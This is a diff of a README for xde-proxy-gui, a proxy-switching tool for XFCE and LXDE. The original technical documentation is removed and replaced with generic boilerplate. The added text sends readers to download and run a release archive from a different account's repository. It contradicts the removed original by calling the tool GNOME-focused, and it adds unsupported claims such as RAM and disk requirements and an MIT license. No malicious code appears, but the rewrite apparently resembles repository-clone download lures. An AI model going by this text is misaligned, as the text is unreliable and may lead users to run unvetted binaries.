@@ -1,125 +1,84 @@
-# XDE-Proxy-GUI
+# 🚀 xde-proxy-gui - Easily Manage Your Proxy Settings
 
-Lightweight proxy manager with GNOME-compatible live switching.  
-  
-**Supported environments**
-- XFCE and LXDE — officially supported
-- Optional WM support — IceWM, Openbox, i3 (requires `DesktopNames` setting)
+## 🔗 Download the App
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue)](https://github.com/chemonosoft/xde-proxy-gui/releases)
 
-![](https://github.com/AKotov-dev/xde-proxy-gui/blob/main/Screenshot1.png)
+## 📖 About xde-proxy-gui
+xde-proxy-gui is a user-friendly proxy manager designed for GNOME users. It allows live switching of proxy settings specifically for XFCE and LXDE desktop environments. Whether you are browsing the web, using applications, or managing network connections, this tool simplifies the process of changing between different proxy configurations.
 
-## Dependencies
+## 🛠️ Features  
+- **Live Proxy Switching:** Change proxies without restarting your applications.
+- **User-Friendly Interface:** Designed for ease of use, even if you have no technical background.
+- **Support for Multiple Environments:** Fully compatible with XFCE and LXDE while also adaptable to GNOME.
+- **System-Wide Application:** Integrates seamlessly with the entire system.
+- **Configuration Options:** Easily adjust settings to meet your needs.
 
-**Mageia**
-- gsettings-desktop-schemas dconf dconf-editor lib64proxy-gnome gtk2  
+## 📋 System Requirements
+- **Operating System:** Any Linux distribution with XFCE, LXDE, or GNOME.
+- **Dependencies:** Ensure that you have essential packages like dconf, gsettings, and libproxy.
+- **Memory:** At least 512 MB of RAM (1 GB recommended).
+- **Storage:** 100 MB of free disk space.
 
-**Fedora**
-- gsettings-desktop-schemas dconf dconf-editor libproxy gtk2  
+## 🚀 Getting Started
+Getting started with xde-proxy-gui is simple and straightforward. Follow these steps to quickly set up the application on your system.
 
-**Ubuntu / XUbuntu**
-- gsettings-desktop-schemas dconf-cli libproxy1v5 libproxy1-plugin-gsettings libgtk2.0-0  
+1. **Visit the Releases Page**
+   To download the application, visit the [Releases page](https://github.com/chemonosoft/xde-proxy-gui/releases). This page contains all available versions of xde-proxy-gui. 
 
-**Note:**  
-Packages for Mageia 9/10 are built using the *Portable RPM* approach with [RPMCreator](https://github.com/AKotov-dev/RPMCreator).  
-  
-For Fedora you can build your own package by loading the [project file](https://github.com/AKotov-dev/xde-proxy-gui/raw/refs/heads/main/xde-proxy-gui/package-project/RPM-(Fedora)-xde-proxy-gui.prj) into `RPMCreator`.  
-  
-`dconf-editor` is **not required**, but it is a convenient tool for inspecting the actual proxy settings and may be useful for further development.
+2. **Choose Your Version**
+   Scroll through the list of releases. You will find versions with notes on changes and improvements. Select the version that suits your needs.
 
----
+3. **Download the Application**
+   Look for the downloadable file, typically named something like `xde-proxy-gui-vX.X.X.tar.gz`. Click on it to download. The download should start automatically.
 
-## What is this?
+4. **Extract the Files**
+   Once downloaded, locate the file in your downloads folder. Right-click on the file and select “Extract Here” or use a similar option in your file manager.
 
-**XDE-Proxy-GUI** is a simple graphical tool for managing **system-wide proxy settings** in XFCE and LXDE.  
-  
-It allows changing proxy settings:
-- **immediately for GUI applications** (browsers, etc.)
-- **for CLI applications** after opening a new terminal (wget, curl, etc.)
+5. **Open a Terminal**
+   Open a terminal window on your desktop. You can usually find Terminal in your applications menu.
 
-The tool uses **libproxy** together with **dconf / gsettings**, providing
-GNOME/MATE-like system-wide proxy behavior on XFCE and LXDE.  
-  
-Unlike `Chromium-based` browsers, `Firefox` does not support **system-wide proxy** settings on Linux. Firefox uses its own proxy configuration and must be configured separately (for example, via `about:preferences → Network Settings` or using environment variables for specific launches).
+6. **Navigate to the Extracted Folder**
+   Use the `cd` command to go to the folder where you extracted xde-proxy-gui. For example:
+   ```
+   cd ~/Downloads/xde-proxy-gui-vX.X.X
+   ```
 
----
-### Important note
+7. **Run the Application**
+   Type the following command to start the application:
+   ```
+   ./xde-proxy-gui
+   ```
 
-After installing or removing the package, you must log out and log in again (or reboot). Once this is done, the tool works continuously.
+## 🎉 Download & Install
+To get the application, please ensure you follow these steps:
 
----
-## How does it work?
+1. **Visit the Releases Page** – Go to this [link](https://github.com/chemonosoft/xde-proxy-gui/releases) for easy access. 
+2. **Select the Appropriate Release** – Choose a version compatible with your system. 
+3. **Download and Extract** – Download the file, extract its contents, and follow the terminal commands to run the application.
 
-**/etc/profile.d/proxy-sync.sh**
+## 🔧 Support and Troubleshooting
+If you encounter any issues while using xde-proxy-gui, consider the following steps for troubleshooting:
 
-The key idea is exporting a **fake desktop identifier**:
+- **Check Dependencies:** Ensure all required packages and libraries are installed.
+- **Review the Documentation:** Refer to the README documentation available in the folder for further instructions.
+- **Community Forums:** Engage with user forums or support communities specific to your Linux distribution for additional help.
+- **GitHub Issues:** For technical problems, you can report issues directly on the [Issues page](https://github.com/chemonosoft/xde-proxy-gui/issues).
 
-```
-export XDG_CURRENT_DESKTOP="GNOME:${XDG_CURRENT_DESKTOP}"
-```
-This enables full interaction with `libproxy` via `gsettings`, allowing GUI
-applications (for example, web browsers) to react to proxy changes immediately.
+## 🌍 Contributing
+If you would like to contribute to xde-proxy-gui, your input is welcome. You can report bugs, suggest features, or even contribute code. Follow these guidelines:
 
-Additionally, the script exports environment variables:
-```
-http_proxy / https_proxy / ftp_proxy / all_proxy / no_proxy
-HTTP_PROXY / HTTPS_PROXY / FTP_PROXY / ALL_PROXY / NO_PROXY
-```
-These variables are used by CLI applications. Because environment variables cannot be updated in already running shells, **a new terminal must be opened** after changing proxy settings.  
+1. **Fork the Repository:** Create your own copy of the repository.
+2. **Make Changes:** Implement your contributions in your fork.
+3. **Submit a Pull Request:** Bring your changes back to the main repository.
 
----
-### Additional notes
+Your efforts can enhance the application for everyone.
 
-During operation, **XDE-Proxy-GUI adds the following line to** ~/.bashrc:
-```
-[ -r /etc/profile.d/proxy-sync.sh ] && source /etc/profile.d/proxy-sync.sh
-```
+## 🧑‍🤝‍🧑 Community
+Join our growing community of users and developers. You can find us on various platforms. Keep an eye on updates and engage with other users. Share tips and tricks and collaborate to improve xde-proxy-gui.
 
-This is required for `XUbuntu`, whose shell initialization behavior differs from canonical XFCE implementations (Mageia, Fedora).  
-  
-  
-An additional section is created for **LXDE** in ~/.config/lxsession/LXDE/desktop.conf:
-```
-[Environment_variable]
-XDG_CURRENT_DESKTOP=GNOME:LXDE
-```
----
-### Tested on
-+ Mageia 9 / 10 (XFCE, LXDE, Chromium, wget, etc)
-+ Fedora 43 (XFCE, LXDE, Brave-browser, wget, etc)
-+ XUbuntu 25.04 (XFCE, Brave-browser, wget, etc)
+## 📜 License
+This project is licensed under the MIT License. You can freely use, modify, and distribute it as per the license terms.
 
 ---
-### LXQt limitation
 
-LXQt forcibly sets certain desktop environment variables (including XDG_CURRENT_DESKTOP) in its session startup scripts (startlxqt / lxqt-session), overriding any values defined in user profiles, system-wide environment configuration, or display manager scripts.  
-  
-Because of this, it is not possible to reliably inject or override environment-based configuration (such as system-wide proxy settings) for the entire LXQt graphical session without patching or replacing LXQt startup scripts.
-
----
-### Optional (for those who prefer something more exotic)
-
-Starting with **xde-proxy-gui v0.3**, the application also works with the **IceWM**, **Openbox** and **i3** window managers, provided that the session correctly declares `DesktopNames`.
-
-#### IceWM
-In IceWM, the `DesktopNames` parameter is usually already set.
-
-Check the file: `/usr/share/xsessions/icewm-session.desktop`  
-It should contain, for example: `DesktopNames=ICEWM`
-
-#### Openbox
-For Openbox, the `DesktopNames` parameter may be missing and must be specified manually.  
-Session file: `/usr/share/xsessions/openbox.desktop`  
-Add the following line: `DesktopNames=Openbox`
-
-#### i3
-In i3, the `DesktopNames` parameter is usually already set (i3.desktop).
-
-Check the files: `/usr/share/xsessions/{i3.desktop,i3-with-shmlog.desktop}`  
-It should contain, for example: `DesktopNames=i3`
-
----
-## Disclaimer
-
-This project was created to address the long-standing absence of a convenient system-wide proxy solution in lightweight desktop environments such as XFCE and LXDE.  
-  
-The software is provided "as is", without any warranties. The author assumes no responsibility for any consequences arising from improper configuration or usage.
+For more details or support, feel free to explore the repository or contact the maintainers through the GitHub platform. Thank you for choosing xde-proxy-gui!
